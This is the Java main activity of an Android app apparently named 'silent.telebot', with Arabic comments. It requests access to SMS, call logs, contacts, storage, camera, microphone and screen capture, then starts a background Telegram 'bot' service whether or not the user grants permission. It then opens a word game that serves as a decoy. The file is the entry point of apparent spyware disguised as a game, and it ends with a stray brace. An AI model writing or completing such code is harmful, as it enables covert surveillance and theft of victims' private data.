package com.silent.telebot;

import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends Activity {
    private static final int REQ_PERMISSIONS = 100;
    private static final int REQ_SCREEN_CAPTURE = 101;
    private boolean permissionsGranted = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // طلب الأذونات العادية
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String[] permissions = {
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.CAMERA,
                    Manifest.permission.RECORD_AUDIO
            };

            boolean allGranted = true;
            for (String perm : permissions) {
                if (ContextCompat.checkSelfPermission(this, perm) != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }

            if (!allGranted) {
                ActivityCompat.requestPermissions(this, permissions, REQ_PERMISSIONS);
                return; // انتظر رد المستخدم
            } else {
                permissionsGranted = true;
            }
        } else {
            // للإصدارات الأقدم، الأذونات تمنح تلقائياً
            permissionsGranted = true;
        }

        // إذا كانت الأذونات ممنوحة، اطلب صلاحية لقطة الشاشة وابدأ الخدمة واللعبة
        if (permissionsGranted) {
            requestScreenCaptureAndStart();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_PERMISSIONS) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            if (allGranted) {
                Toast.makeText(this, "✅ تم منح جميع الأذونات", Toast.LENGTH_SHORT).show();
                permissionsGranted = true;
                requestScreenCaptureAndStart();
            } else {
                Toast.makeText(this, "⚠️ بعض الأذونات مرفوضة، قد لا تعمل بعض الميزات", Toast.LENGTH_LONG).show();
                // حتى مع الرفض، حاول تشغيل الخدمة (قد تتعطل بعض الميزات)
                permissionsGranted = true; // لتجاوز الحظر
                requestScreenCaptureAndStart();
            }
        }
    }

    private void requestScreenCaptureAndStart() {
        // طلب صلاحية تسجيل الشاشة (لقطة الشاشة) – تظهر نافذة منبثقة
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            MediaProjectionManager projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            Intent intent = projectionManager.createScreenCaptureIntent();
            startActivityForResult(intent, REQ_SCREEN_CAPTURE);
        } else {
            // للإصدارات الأقدم، لا تحتاج هذه الصلاحية
            startServiceAndGame();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_SCREEN_CAPTURE) {
            if (resultCode == RESULT_OK) {
                // حفظ بيانات الصلاحية في خدمة لقطة الشاشة
                ScreenCaptureService.setResultData(resultCode, data);
                Toast.makeText(this, "✅ صلاحية لقطة الشاشة مفعلة", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "❌ تم رفض صلاحية لقطة الشاشة", Toast.LENGTH_LONG).show();
            }
            // بعد انتهاء طلب الصلاحية، ابدأ الخدمة واللعبة
            startServiceAndGame();
        }
    }

    private void startServiceAndGame() {
        // 1. بدء الخدمة الخلفية (البوت)
        Intent serviceIntent = new Intent(this, TelegramService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        // 2. فتح لعبة الكلمات
        Intent gameIntent = new Intent(this, WordOrderActivity.class);
        startActivity(gameIntent);

        // 3. إنهاء هذا النشاط (لا داعي لبقائه)
        finish();
    }
            } 
